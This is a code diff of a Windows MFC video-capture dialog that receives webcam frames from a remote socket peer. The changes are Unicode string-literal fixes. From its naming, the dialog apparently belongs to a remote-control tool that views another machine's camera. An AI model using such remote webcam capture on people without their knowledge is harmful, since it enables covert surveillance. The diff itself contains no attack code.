@@ -54,9 +54,9 @@ void CVideoDlg::SetConnSocket(SOCKET socket)
 	int cb = sizeof(addr);
 	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
 	CString OnlineIP;
-	OnlineIP.Format("%s:%d", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));//ntohs函数将u_long转int
+	OnlineIP.Format(_T("%s:%d"), CString(inet_ntoa(addr.sin_addr)), ntohs(addr.sin_port));//ntohs函数将u_long转int
 
-	SetWindowText("[视频捕捉] " + OnlineIP);
+	SetWindowText(_T("[视频捕捉] ") + OnlineIP);
 
 	VideoStart();
 }
@@ -91,7 +91,7 @@ BOOL CVideoDlg::OnInitDialog()
 	GetClientRect(&rc);
 	rc.bottom -= 50;
 	m_PicBox.MoveWindow(&rc);
-	m_PicBox.SetTipText("请稍后，设备正在初始化……");
+	m_PicBox.SetTipText(_T("请稍后，设备正在初始化……"));
 
 	return TRUE;
 }
@@ -112,7 +112,6 @@ void CVideoDlg::OnCancel()
 
 void CVideoDlg::PostNcDestroy()
 {
-	// TODO: Add your specialized code here and/or call the base class
 	delete this;
 	CDialog::PostNcDestroy();
 }
@@ -157,7 +156,7 @@ DWORD CVideoDlg::RecvVideo()
 	//send socket type
 	if (!RecvMsg(m_ConnSocket, chBuffer, &msgHead))
 	{
-		MessageBox("接收数据失败", "提示");
+		MessageBox(_T("接收数据失败"), _T("提示"));
 		closesocket(m_ConnSocket);
 		return 0;//send socket type error
 	}
@@ -169,18 +168,18 @@ DWORD CVideoDlg::RecvVideo()
 		break;
 	case 1:
 	{
-		MessageBox("设备不存在或被其他程序占用", "提示");
+		MessageBox(_T("设备不存在或被其他程序占用"), _T("提示"));
 		PostMessage(WM_COMMAND, IDCANCEL);
 		return 0;
 	}
 	case 2:
 	{
-		MessageBox("视频设备初始化失败", "提示");
+		MessageBox(_T("视频设备初始化失败"), _T("提示"));
 		PostMessage(WM_COMMAND, IDCANCEL);
 		return 0;
 	}
 	default:
-		MessageBox("未知错误", "提示");
+		MessageBox(_T("未知错误"), _T("提示"));
 		PostMessage(WM_COMMAND, IDCANCEL);
 		return 0;
 	}
@@ -288,7 +287,7 @@ void CVideoDlg::VideoStop()
 
 HBITMAP CVideoDlg::GetBitmapFromData(LPBITMAPINFO lpBmpInfo, BYTE* pDibData)
 {
-	HDC hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
+	HDC hDC = CreateDC(_T("DISPLAY"), NULL, NULL, NULL);
 	// 创建DDB位图
 	HBITMAP hBitmap = CreateDIBitmap(
 		hDC,
@@ -305,7 +304,7 @@ HBITMAP CVideoDlg::GetBitmapFromData(LPBITMAPINFO lpBmpInfo, BYTE* pDibData)
 
 void CVideoDlg::OnBtnRecords()
 {
-	CFileDialog dlgFileOpen(FALSE, ".avi", NULL, OFN_HIDEREADONLY, "AVI Files(*.avi)|*.avi||");
+	CFileDialog dlgFileOpen(FALSE, _T(".avi"), NULL, OFN_HIDEREADONLY, _T("AVI Files(*.avi)|*.avi||"));
 	if (dlgFileOpen.DoModal() != IDOK)
 		return;
 	CString strAVIFile = dlgFileOpen.GetPathName();
